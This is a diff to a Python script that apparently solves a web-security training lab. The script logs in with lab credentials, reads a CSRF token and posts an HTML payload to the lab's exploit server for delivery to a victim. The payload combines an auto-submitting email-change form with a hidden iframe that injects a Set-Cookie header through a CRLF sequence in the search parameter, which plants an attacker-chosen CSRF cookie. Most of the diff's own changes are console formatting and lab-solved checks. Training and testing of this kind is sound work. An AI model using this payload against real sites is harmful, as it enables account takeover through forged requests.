@@ -4,6 +4,7 @@ from requests import Session
 import requests
 
 from rich.console import Console
+from rich.text import Text
 from valid8 import validate
 import re
 from typing import Callable
@@ -24,16 +25,20 @@ def pattern(regex: str) -> Callable[[str], bool]:
 
 
 def login(server):
+    #console.print(f"{'─'*30}'Login'{'─'*30}")
+    title = 'Login'
+    console.print(f"{'─' * ((64 - len(title)) // 2)}'{title}'{'─' * ((64 - len(title)) // 2)}")
     response = session.get(f"{server}/login")
     html_document = html.fromstring(response.content)
     csrf_token = html_document.xpath("//section/form/input[@name='csrf']/@value")[0]
-    console.log(f"CSRF Token: {csrf_token}")
+    console.log(f"Get CSRF Token: {csrf_token}")
     response = session.post(f"{server}/login", data={
         "csrf": csrf_token,
         "username": "wiener",
         "password": "peter"
     })
     console.log(f"Login status code: {response.history[0].status_code}")
+    console.print(f"{'─' * 65}")
     return response.history
 
 
@@ -45,11 +50,13 @@ def get_exploit_server(server):
     else:
         exploit_server_link = html_document.xpath("//a[@id='exploit-link']/@href")[0]
         session.get(f"{exploit_server_link}")
-        console.log(f"Exploit server status code: {response.status_code}")
+        console.log(f"Go to exploit server status code: {response.status_code}")
         return exploit_server_link
 
 
 def exploit_server_operation(mode: str, inject_html: str, server):
+    title = f"{mode} on exploit server"
+    console.print(f"{'─'*((64-len(title))//2)}'{title}'{'─'*((64-len(title))//2)}")
     exploit_server = get_exploit_server(server)
     response = session.post(f"{exploit_server}", data={
         "urlIsHttps": "on",
@@ -59,7 +66,8 @@ def exploit_server_operation(mode: str, inject_html: str, server):
         "responseBody": inject_html,
         "formAction": mode
     })
-    console.log(f"Get exploit server status code: {response.status_code}")
+    console.log(f"{mode} operation status code: {response.status_code}")
+    console.print(f"{'─' * 65}")
 
 
 def check_lab_solver(server):
@@ -76,7 +84,11 @@ def check_lab_solver(server):
 
 
 def is_lab_solved(server):
-    return True if get_exploit_server(server) == "" else False
+    # return True if get_exploit_server(server) == "" else False
+    response = requests.get(f"{server}/")
+    html_document = html.fromstring(response.content)
+    solved_link = html_document.xpath("//section[@id='notification-labsolved']")
+    return True if solved_link else False
 
 
 def validate_server(server):
@@ -85,8 +97,6 @@ def validate_server(server):
 
     if requests.get(f"{server}").status_code != 200:
         raise Exception("URL NOT VALID!")
-
-    return server
 
 
 @app.callback()
@@ -106,13 +116,11 @@ def main(
                   "</form>" \
                   f"<iframe style=\"display:none\" src=\"{server}/?search=foo%0ASet%2DCookie%3A%20csrf%3Dciaoatutti%3B%20SameSite%3DNone\" onload=\"document.getElementById('email-form').submit();\"></iframe>"
 
-    server = validate_server(server)
+    validate_server(server)
 
     if not is_lab_solved(server):
         with console.status("Login..."):
             login(server)
-        with console.status("Go to exploit server..."):
-            get_exploit_server(server)
         with console.status("Storing..."):
             exploit_server_operation("STORE", inject_html, server)
         with console.status("Delivering to the victim"):
